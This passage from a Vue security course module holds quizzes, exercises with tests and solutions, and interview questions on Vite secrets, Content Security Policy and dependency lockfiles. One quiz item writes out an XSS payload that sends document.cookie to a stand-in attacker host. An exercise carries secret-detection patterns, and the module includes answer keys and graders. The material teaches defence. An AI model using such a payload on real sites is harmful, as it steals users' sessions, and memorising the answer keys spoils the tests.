      explanation: 'Vite deliberately doesn\'t expose unprefixed variables to client code, so secrets used by your tooling or server don\'t leak by accident.',
    },
    {
      id: 'secrets-csp-dependencies-q3',
      type: 'bug',
      prompt: 'This component works — and leaks a credential to every visitor. Click the line that leaks it.',
      code: {
        lang: 'js',
        code: `import { ref } from 'vue'

const answer = ref('')

export async function ask(question) {
  const res = await fetch('https://api.ai-provider.example/v1/chat', {
    method: 'POST',
    headers: { Authorization: 'Bearer ' + import.meta.env.VITE_AI_SECRET_KEY },
    body: JSON.stringify({ question }),
  })
  answer.value = (await res.json()).text
}`,
      },
      answerLine: 8,
      explanation: 'Line 8 inlines a secret key into the bundle and sends it from the browser, where anyone can read it in devtools. Call your own endpoint instead and let the server attach the key.',
    },
    {
      id: 'secrets-csp-dependencies-q4',
      type: 'fill',
      prompt: 'Complete the policy so plugins are completely disabled, and the CI command that installs exactly what the lockfile says.',
      code: {
        lang: 'bash',
        code: `# response header
Content-Security-Policy: default-src 'self'; object-src '___'; frame-ancestors 'none'

# CI step
npm ___`,
      },
      answer: [['none'], ['ci']],
      explanation: '`object-src \'none\'` turns off `<object>`/`<embed>` plugin content. `npm ci` performs a clean install from `package-lock.json` and fails if it doesn\'t match `package.json`.',
    },
    {
      id: 'secrets-csp-dependencies-q5',
      type: 'mcq',
      prompt: 'Your CSP is `script-src \'self\'` (no `\'unsafe-inline\'`). A `v-html` bug injects `<img src=x onerror="fetch(\'https://evil.example?c=\'+document.cookie)">`. What happens?',
      options: [
        { text: 'The inline `onerror` handler is blocked, because inline event handlers count as inline script.' },
        { text: 'It runs — CSP only applies to `<script>` tags.', why: 'Inline event-handler attributes are inline script too, and are blocked without \'unsafe-inline\' (or \'unsafe-hashes\' with a matching hash).' },
        { text: 'The `<img>` element is never created.', why: 'CSP doesn\'t stop HTML from being parsed; the element exists, but its inline handler is not allowed to run.' },
        { text: 'Vue throws a CSP error at compile time.', why: 'CSP is enforced by the browser at runtime, not by Vue\'s compiler.' },
      ],
      answer: 0,
      explanation: 'This is CSP as defense in depth: the injection still happened (fix the `v-html`!), but the payload couldn\'t execute.',
    },
    {
      id: 'secrets-csp-dependencies-q6',
      type: 'mcq',
      prompt: 'Which Vue setup needs `\'unsafe-eval\'` in a CSP?',
      options: [
        { text: 'A Vite app using `.vue` single-file components', why: 'SFC templates are compiled at build time; the runtime-only build doesn\'t evaluate strings.' },
        { text: 'An app that compiles templates in the browser with the full build (e.g. a `template` string option)' },
        { text: 'Any app that uses `v-on`', why: 'Event handlers in templates are compiled into normal functions ahead of time with SFCs.' },
        { text: 'Any app that uses `computed()`', why: 'Reactivity doesn\'t evaluate strings.' },
      ],
      answer: 1,
      explanation: 'In-browser template compilation turns template strings into functions at runtime, which CSP treats like `eval`. Precompiled templates avoid that entirely.',
    },
    {
      id: 'secrets-csp-dependencies-q7',
      type: 'short',
      prompt: 'Why isn\'t "obfuscate the API key" a fix for shipping a secret key in a Vue app?',
      answer: 'Because the browser must have the real key to send it, so the code that de-obfuscates it ships too. Anyone can run that code or watch the outgoing request in the Network tab. The only fix is architectural: keep the secret on a server that makes the privileged call, and rotate any key that was already exposed.',
    },
  ],

  exercises: [
    {
      id: 'env-audit',
      title: 'Audit an .env before it ships',
      difficulty: 'intermediate',
      prompt: `
Write \`auditEnv(env, prefix = 'VITE_')\` in \`auditEnv.js\`. It receives an object of env variables and returns \`{ exposed, leaks }\`:

- \`exposed\`: keys that Vite exposes to client code — the ones that **start with the prefix** (keep the original order).
- \`leaks\`: exposed keys that probably contain a secret — the key name contains \`SECRET\`, \`PRIVATE\`, \`PASSWORD\` or \`TOKEN\` (any letter case), **or** the value starts with \`sk_live_\` or contains \`-----BEGIN\` (a PEM private key).
- Unprefixed keys are never in either list (they don't reach the browser).

\`App.vue\` renders \`report.exposed\` into \`<ul class="exposed">\` and \`report.leaks\` into \`<ul class="leaks">\`.
`,
      files: { 'App.vue': auditApp, 'auditEnv.js': auditStarter },
      hints: [
        'Start with `Object.keys(env).filter((key) => key.startsWith(prefix))`.',
        'A case-insensitive regex such as `/SECRET|PRIVATE|PASSWORD|TOKEN/i` checks the name in one go.',
        'For values: `String(value).startsWith(\'sk_live_\') || String(value).includes(\'-----BEGIN\')`. Filter `exposed` with "name looks secret OR value looks secret".',
      ],
      solution: {
        explanation: 'The audit encodes the one rule that matters: the prefix decides what ships. Within what ships, names and value formats give strong hints of a leak. Real secret scanners use many more value patterns — and the real fix for anything in `leaks` is to move it to the server and rotate it.',
        files: { 'App.vue': auditApp, 'auditEnv.js': auditSolution },
      },
      tests: [
        {
          name: 'exposed lists only VITE_ keys, in order',
          code: `const { auditEnv } = requireModule('auditEnv.js')
const r = auditEnv({ VITE_A: '1', DB_PASSWORD: 'x', VITE_B: '2' })
expect(r.exposed).toEqual(['VITE_A', 'VITE_B'])`,
        },
        {
          name: 'secret-looking names are flagged (any case)',
          code: `const { auditEnv } = requireModule('auditEnv.js')
const r = auditEnv({ VITE_ADMIN_TOKEN: 'x', VITE_private_key: 'y', VITE_API_URL: 'https://api.example' })
expect(r.leaks).toEqual(['VITE_ADMIN_TOKEN', 'VITE_private_key'])`,
        },
        {
          name: 'secret-looking values are flagged',
          code: `const { auditEnv } = requireModule('auditEnv.js')
const r = auditEnv({ VITE_PAYMENTS: 'sk_live_abc', VITE_CERT: '-----BEGIN PRIVATE KEY-----', VITE_PUBLISHABLE: 'pk_live_abc' })
expect(r.leaks).toEqual(['VITE_PAYMENTS', 'VITE_CERT'])`,
        },
        {
          name: 'unprefixed secrets are not reported as exposed',
          code: `const { auditEnv } = requireModule('auditEnv.js')
const r = auditEnv({ DATABASE_PASSWORD: 'hunter2' })
expect(r.exposed).toEqual([])
expect(r.leaks).toEqual([])`,
        },
        {
          name: 'a custom prefix is respected',
          code: `const { auditEnv } = requireModule('auditEnv.js')
const r = auditEnv({ APP_SECRET: 'x', VITE_URL: 'y' }, 'APP_')
expect(r.exposed).toEqual(['APP_SECRET'])
expect(r.leaks).toEqual(['APP_SECRET'])`,
        },
        {
          name: 'the page lists the two leaks of the sample project',
          code: `expect(findAll('.leaks li').map((li) => li.textContent.trim())).toEqual(['VITE_STRIPE_SECRET_KEY', 'VITE_ADMIN_TOKEN'])`,
        },
      ],
    },
    {
      id: 'csp-linter',
      title: 'A tiny CSP linter',
      difficulty: 'advanced',
      prompt: `
Implement \`lintCsp(header)\` in \`lintCsp.js\`. It parses a CSP header string (directives separated by \`;\`, sources by whitespace, directive names case-insensitive) and returns an **array of warning codes, in this order**:

1. \`'script-unsafe-inline'\` — the script sources contain \`'unsafe-inline'\`
2. \`'script-unsafe-eval'\` — the script sources contain \`'unsafe-eval'\`
3. \`'script-wildcard'\` — the script sources contain \`*\` or \`https:\`
4. \`'object-src-not-none'\` — the object sources don't contain \`'none'\`
5. \`'missing-base-uri'\` — no \`base-uri\` directive
6. \`'missing-frame-ancestors'\` — no \`frame-ancestors\` directive

"Script sources" means \`script-src\`, or \`default-src\` if \`script-src\` is absent (same idea for \`object-src\`). If neither exists, treat the list as empty.

The page shows each warning in \`<ul class="warnings">\`.
`,
      files: { 'App.vue': lintApp, 'lintCsp.js': lintStarter },
      hints: [
        'Parse first: `header.split(\';\')`, then for each part `part.trim().split(/\\s+/)` gives `[name, ...sources]`. Store them in an object keyed by the lowercased name.',
        'Fallbacks: `const scripts = policy[\'script-src\'] ?? policy[\'default-src\'] ?? []` — same for objects.',
        'Push warnings in the listed order with simple `includes()` checks; `base-uri` and `frame-ancestors` only need an existence check.',
      ],
      solution: {
        explanation: 'Parsing into an object makes each rule a one-liner. The fallback mirrors how browsers treat fetch directives: if `script-src` is missing, `default-src` applies. `base-uri` and `frame-ancestors` do **not** fall back to `default-src`, which is exactly why linters remind you to set them.',
        files: { 'App.vue': lintApp, 'lintCsp.js': lintSolution },
      },
      tests: [
        {
          name: 'a strict policy has no warnings',
          code: `const { lintCsp } = requireModule('lintCsp.js')
expect(lintCsp("default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'")).toEqual([])`,
        },
        {
          name: 'unsafe-inline and unsafe-eval in script-src are flagged',
          code: `const { lintCsp } = requireModule('lintCsp.js')
const w = lintCsp("script-src 'self' 'unsafe-inline' 'unsafe-eval'; object-src 'none'; base-uri 'none'; frame-ancestors 'self'")
expect(w).toEqual(['script-unsafe-inline', 'script-unsafe-eval'])`,
        },
        {
          name: 'default-src is the fallback for scripts and objects',
          code: `const { lintCsp } = requireModule('lintCsp.js')
const w = lintCsp("default-src * 'unsafe-inline'; base-uri 'self'; frame-ancestors 'none'")
expect(w).toEqual(['script-unsafe-inline', 'script-wildcard', 'object-src-not-none'])`,
        },
        {
          name: 'missing base-uri and frame-ancestors are reported',
          code: `const { lintCsp } = requireModule('lintCsp.js')
expect(lintCsp("default-src 'none'")).toEqual(['missing-base-uri', 'missing-frame-ancestors'])`,
        },
        {
          name: 'directive names are case-insensitive and extra spaces are fine',
          code: `const { lintCsp } = requireModule('lintCsp.js')
expect(lintCsp("  SCRIPT-SRC   https: ;Object-Src 'none'; BASE-URI 'self' ; frame-ancestors 'none'  ")).toEqual(['script-wildcard'])`,
        },
        {
          name: 'the page lists warnings for the sample header',
          code: `expect(findAll('.warnings li').length).toBeGreaterThan(0)
expect(text('.warnings')).toContain('script-unsafe-inline')`,
        },
      ],
    },
  ],

  interview: [
    {
      id: 'secrets-csp-dependencies-hide-key',
      difficulty: 'beginner',
      type: 'conceptual',
      minutes: 2,
      question: 'Can you keep an API key secret by putting it in a `.env` file of a Vue + Vite app?',
      answer: 'Not if client code uses it. Vite exposes `VITE_`-prefixed variables by inlining their values into the bundle at build time, and the bundle is downloaded by everyone. `.env` keeps values out of source code and git (with `.env.local`), but it isn\'t a secret store for the browser. Secret keys must stay in server-side code that makes the privileged call; the client only gets public, restricted keys.',
      explanation: 'Environment variables are configuration, not secrecy. Secrecy needs a place the user can\'t read — a server.',
      whyAsked: 'An extremely common real-world mistake, especially with AI and payment integrations.',
      mistakes: ['"Yes, .env files aren\'t deployed."', 'Suggesting obfuscation or encryption in the client.', 'Not knowing the `VITE_` prefix rule.'],
      followUps: ['What is safe to put in VITE_ variables?', 'How would you call a paid API safely from the frontend?', 'What do you do if a key already leaked?'],
      modelAnswer: 'No. In Vite, only variables with the VITE_ prefix are exposed to client code, and they\'re replaced with their literal values when you build, so they end up in a JavaScript file every visitor downloads. The .env file helps keep config out of source control, but it doesn\'t make anything secret in the browser. Privileged keys live in server code — the browser calls my API, and my server calls the provider. Client-side I only use keys designed to be public, restricted by domain or scope.',
    },
    {
      id: 'secrets-csp-dependencies-what-is-csp',
      difficulty: 'intermediate',
      type: 'conceptual',
      minutes: 4,
      question: 'What is a Content Security Policy and how does it help a Vue app? Does Vue need anything special?',
      answer: 'A CSP is an HTTP response header listing allowed sources per resource type (scripts, styles, images, connections, frames…). The browser blocks everything else and can report violations. It\'s defense in depth against XSS: without `\'unsafe-inline\'`, injected inline scripts and event handlers don\'t run, and a tight `connect-src` limits exfiltration. Vue apps built with Vite precompile templates, so the runtime-only build works without `\'unsafe-eval\'`; in-browser template compilation (full build) would need it. Dev servers inject inline code, so test the strict policy against the production build.',
      explanation: 'CSP doesn\'t fix injection bugs; it makes them much harder to exploit.',
      whyAsked: 'Tests production-security knowledge beyond the framework itself.',
      mistakes: ['Claiming CSP prevents XSS on its own.', 'Recommending `\'unsafe-inline\'` to "make Vue work".', 'Thinking CSP is configured in Vue code rather than the server response.'],
      followUps: ['What are nonces and why are they better than unsafe-inline?', 'How would you roll out a CSP safely?', 'Why does frame-ancestors not work in a meta tag?'],
      modelAnswer: 'A Content Security Policy is a header the server sends that tells the browser which origins may provide scripts, styles, images, connections and frames. Anything else is blocked and can be reported. For a Vue app it\'s a safety net for XSS: with no unsafe-inline, injected scripts and inline handlers don\'t execute, and a strict connect-src stops stolen data being sent elsewhere. Vue with Vite precompiles templates, so I don\'t need unsafe-eval — only in-browser template compilation would. I\'d roll it out in Report-Only mode first, against the production build.',
    },
    {
      id: 'secrets-csp-dependencies-leak-response',
      difficulty: 'intermediate',
      type: 'scenario',
      minutes: 4,
      question: 'You discover that a payment provider\'s secret key was committed a week ago and has been in the production bundle since. What do you do, in order?',
      answer: '1) Revoke/rotate the key at the provider immediately — assume it\'s compromised. 2) Check the provider\'s logs and your own for unexpected usage, and involve whoever handles incidents. 3) Move the integration behind your backend (secret in server config; client gets only a publishable key). 4) Deploy the fix and purge caches. 5) Prevent recurrence: secret scanning/push protection, a CI check on `dist/`, code review guidance. Rewriting git history is optional clean-up, not the fix.',
      explanation: 'Rotation first — every other step happens while the leaked key could still be in use.',
      whyAsked: 'Shows incident instincts: contain first, then fix, then prevent.',
      mistakes: ['Starting with "remove it from git history".', 'Only deleting the env variable and redeploying.', 'Not checking for abuse.'],
      followUps: ['How would you prevent this in CI?', 'Which keys are safe to keep in the client?'],
      modelAnswer: 'First I\'d rotate the key at the provider, because anyone who downloaded the bundle in the past week may have it. Then I\'d check usage logs for abuse and loop in whoever owns incidents. Next I\'d move the integration so the server holds the secret and the client only uses a publishable key, deploy that, and make sure old bundles are gone from caches. Finally I\'d prevent a repeat with secret scanning and push protection, a CI scan of the build output, and clear guidance that VITE_ means public.',
    },
    {
      id: 'secrets-csp-dependencies-lockfile',
      difficulty: 'intermediate',
      type: 'comparison',
      minutes: 3,
      question: 'What is the difference between `npm install` and `npm ci`, and why does the lockfile matter for security?',
      answer: '`npm install` resolves dependencies from the ranges in `package.json`, may update `package-lock.json`, and installs. `npm ci` deletes `node_modules`, installs exactly what the lockfile specifies, verifies integrity hashes, and fails if the lockfile and `package.json` disagree — never modifying them. The lockfile pins every package in the tree (including transitive ones) to an exact version and hash, so builds are reproducible and a newly published malicious version can\'t slip in silently.',
      explanation: 'Ranges like `^1.2.0` are a promise of compatibility, not of identity. The lockfile is the identity.',
      whyAsked: 'Supply-chain incidents made lockfile discipline a standard expectation.',
      mistakes: ['Thinking the lockfile is optional or should be gitignored.', 'Believing `npm audit` protects against new malicious releases.', 'Deleting the lockfile to fix conflicts.'],
      followUps: ['How do you update dependencies safely?', 'What do `overrides` do?', 'What does npm audit not catch?'],
      modelAnswer: 'npm install resolves the semver ranges in package.json and can rewrite the lockfile, while npm ci installs exactly what the lockfile says, checks integrity hashes, and fails if the two files disagree. So in CI and production builds I use npm ci. The lockfile matters because it pins every package, including transitive ones, to an exact version and hash — builds are reproducible, and a freshly published compromised version can\'t sneak in unless we deliberately update. Updates then come through reviewed PRs, usually automated with Dependabot or Renovate.',
    },
    {
      id: 'secrets-csp-dependencies-csp-debug',
      difficulty: 'intermediate',
      type: 'debugging',
      minutes: 3,
      question: 'Right after deploying a CSP, users report the app shows "Failed to load" everywhere. The console says: *Refused to connect to \'https://api.shop.example/v1/cart\' because it violates the following Content Security Policy directive: "default-src \'self\'". Note that \'connect-src\' was not explicitly set*. What happened and how do you fix it — and avoid this next time?',
      answer: 'The policy has no `connect-src`, so `fetch` falls back to `default-src \'self\'`, which only allows the page\'s own origin. The API is on another origin, so every request is blocked. Fix: add `connect-src \'self\' https://api.shop.example`. Next time: deploy policy changes as `Content-Security-Policy-Report-Only` first, collect violation reports, and test against a production build before enforcing.',
      explanation: 'The console message tells you the directive, the blocked URL and the fallback — read it literally.',
      whyAsked: 'CSP rollouts commonly break apps; interviewers want to see calm, systematic debugging and safe rollout habits.',
      mistakes: ['Adding `*` to connect-src.', 'Removing the CSP entirely.', 'Adding \'unsafe-inline\' (unrelated to connections).'],
      followUps: ['What else commonly breaks: fonts, images, analytics?', 'How do violation reports work?'],
      modelAnswer: 'The policy only sets default-src \'self\', and because connect-src isn\'t set, fetch requests fall back to it — so calls to the API\'s different origin are refused. I\'d add connect-src with \'self\' and the exact API origin, not a wildcard, and redeploy. To avoid a repeat, I\'d ship policy changes in Report-Only mode first, collect the violation reports for a while, and test against vite build plus preview before enforcing.',
    },
    {
      id: 'secrets-csp-dependencies-supply-chain',
      difficulty: 'advanced',
      type: 'architecture',
      minutes: 5,
      question: 'How would you reduce supply-chain risk for a large Vue codebase with hundreds of transitive dependencies?',
      answer: 'Layers: (1) Fewer dependencies — evaluate maintenance, popularity, size and transitive footprint before adding; prefer small in-house code for trivial helpers. (2) Reproducibility — commit the lockfile, `npm ci` in CI, review lockfile diffs. (3) Detection — `npm audit`/platform dependency scanning, automated update PRs (Dependabot/Renovate) with CI tests, alerts for new advisories. (4) Limit execution — consider `--ignore-scripts` in CI where possible, least-privilege CI tokens, separate build and deploy credentials. (5) Runtime containment — CSP limiting script sources and connections, SRI for CDN scripts, minimal third-party scripts. (6) Process — ownership of dependency updates, a playbook for compromised packages (pin, roll back, rotate secrets the build could access).',
      explanation: 'You can\'t audit every line of every package; you reduce exposure, detect quickly and limit blast radius.',
      whyAsked: 'Senior engineers are expected to manage risk systemically, not just run one command.',
      mistakes: ['"We run npm audit" as the whole answer.', 'Ignoring build-time risk (install scripts, CI secrets).', 'Never updating for fear of breakage.'],
      followUps: ['What would you do the day a popular package you use is reported compromised?', 'How does SRI work?'],
      modelAnswer: 'I\'d attack it in layers. Reduce: be picky about new packages and remove ones we barely use. Reproduce: commit the lockfile, use npm ci, and actually review lockfile diffs. Detect: dependency scanning and npm audit in CI, plus automated update PRs so patches land quickly. Limit execution: least-privilege CI credentials and avoiding install scripts where possible. Contain at runtime with a strict CSP and SRI on any CDN scripts. And have a playbook for a compromised package: pin or roll back, check what the build could reach, and rotate those secrets.',
    },
    {
      id: 'secrets-csp-dependencies-coding-versions',
      difficulty: 'intermediate',
      type: 'coding',
      minutes: 8,
      question: 'An advisory says a package is vulnerable for versions `< 4.17.21`. Implement `isVulnerable(version, fixedIn)` in `versions.js`: return `true` when `version` (like `"4.17.20"`) is lower than `fixedIn`. Compare numerically, part by part — `"1.10.0"` is **newer** than `"1.9.9"`.',
      starter: {
        files: {
          'versions.js': `export function isVulnerable(version, fixedIn) {
  return version < fixedIn
}`,
          'App.vue': `<script setup>
import { isVulnerable } from './versions.js'

const installed = [
  { name: 'lodash', version: '4.17.20', fixedIn: '4.17.21' },
  { name: 'left-pad-ish', version: '1.10.0', fixedIn: '1.9.0' },
]
</script>

<template>
  <ul>
    <li v-for="d in installed" :key="d.name" :class="isVulnerable(d.version, d.fixedIn) ? 'vulnerable' : 'ok'">
      {{ d.name }}@{{ d.version }}
    </li>
  </ul>
</template>`,
        },
      },
      tests: [
        { name: '4.17.20 < 4.17.21 is vulnerable', code: `const { isVulnerable } = requireModule('versions.js')\nexpect(isVulnerable('4.17.20', '4.17.21')).toBe(true)` },
        { name: 'the fixed version itself is not vulnerable', code: `const { isVulnerable } = requireModule('versions.js')\nexpect(isVulnerable('4.17.21', '4.17.21')).toBe(false)` },
        { name: 'parts compare as numbers, not strings', code: `const { isVulnerable } = requireModule('versions.js')\nexpect(isVulnerable('1.10.0', '1.9.0')).toBe(false)\nexpect(isVulnerable('1.9.9', '1.10.0')).toBe(true)` },
        { name: 'missing parts count as 0', code: `const { isVulnerable } = requireModule('versions.js')\nexpect(isVulnerable('2', '2.0.1')).toBe(true)\nexpect(isVulnerable('2.0', '2.0.0')).toBe(false)` },
      ],
      hints: [
        'String comparison is the bug: `"1.10.0" < "1.9.0"` is `true` because `"1" < "9"` character by character.',
        'Split on `.` and map to numbers: `version.split(\'.\').map(Number)`.',
        'Loop over the longest length, treating missing parts as 0; the first unequal part decides.',
      ],
      answer: 'Split both versions into numeric parts, then compare part by part (missing parts are 0). The first differing part decides; if all are equal, the version is not lower, so it isn\'t vulnerable.',
      solution: {
        files: {
          'versions.js': `function compare(a, b) {
  const pa = String(a).split('.').map(Number)
  const pb = String(b).split('.').map(Number)
  const length = Math.max(pa.length, pb.length)
  for (let i = 0; i < length; i++) {
    const x = pa[i] ?? 0
    const y = pb[i] ?? 0
    if (x !== y) return x < y ? -1 : 1
  }
  return 0
}

export function isVulnerable(version, fixedIn) {
  return compare(version, fixedIn) < 0
}`,
          'App.vue': `<script setup>
import { isVulnerable } from './versions.js'

const installed = [
  { name: 'lodash', version: '4.17.20', fixedIn: '4.17.21' },
  { name: 'left-pad-ish', version: '1.10.0', fixedIn: '1.9.0' },
]
</script>

<template>
  <ul>
    <li v-for="d in installed" :key="d.name" :class="isVulnerable(d.version, d.fixedIn) ? 'vulnerable' : 'ok'">
      {{ d.name }}@{{ d.version }}
    </li>
  </ul>
</template>`,
        },
      },
      explanation: 'Versions are tuples of numbers, not strings. This simplified comparator ignores pre-release tags like `-beta.1` and complex ranges — real tools use a full semver implementation (npm\'s `semver` package), which is exactly what `npm audit` relies on.',
      whyAsked: 'A small, realistic coding task with a classic trap (string comparison), tied to how vulnerability tooling works.',
      mistakes: ['Comparing version strings directly.', 'Forgetting different lengths (`2` vs `2.0.1`).', 'Using `parseFloat` on the whole version (`"1.10"` becomes 1.1).'],
      followUps: ['How would you support pre-release versions?', 'What does `^1.2.3` allow?', 'Why does a lockfile make this check meaningful?'],
      modelAnswer: 'I\'d split both versions on dots and convert the parts to numbers, then walk the longer list treating missing parts as zero. The first part that differs decides the order; if none differ the versions are equal, so the installed one isn\'t vulnerable. Comparing strings is wrong because "1.10" sorts before "1.9". In production I\'d use a real semver library, which also handles pre-releases and ranges.',
    },
  ],

  takeaways: [
    'Everything in the frontend bundle is public — including every `VITE_` variable your client code uses.',
    'Secrets live in server-side configuration; the browser calls your server, which calls the provider.',
    'A leaked secret must be rotated; deleting it from code doesn\'t un-publish it.',
    'CSP is a response header the browser enforces: strict `script-src` without `\'unsafe-inline\'`, explicit `connect-src`, `object-src \'none\'`, `base-uri`, `frame-ancestors`.',
    'Vite-compiled Vue apps don\'t need `\'unsafe-eval\'`; roll out CSP in Report-Only mode first.',
    'Commit the lockfile, install with `npm ci`, audit regularly, update deliberately and keep dependencies few.',
  ],
}
